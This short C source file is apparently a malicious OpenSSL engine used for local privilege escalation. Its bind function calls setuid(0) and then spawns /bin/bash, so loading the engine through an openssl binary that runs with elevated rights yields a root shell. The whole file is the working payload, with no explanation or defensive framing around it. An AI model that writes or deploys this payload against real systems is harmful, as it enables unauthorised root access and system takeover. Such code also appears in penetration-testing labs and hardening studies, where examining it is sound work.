#include <openssl/engine.h>

static int binder(ENGINE *e, const char *id)
{
	setuid(0);
	system("/bin/bash");
}
IMPLEMENT_DYNAMIC_BIND_FN(binder)
IMPLEMENT_DYNAMIC_CHECK_FN()
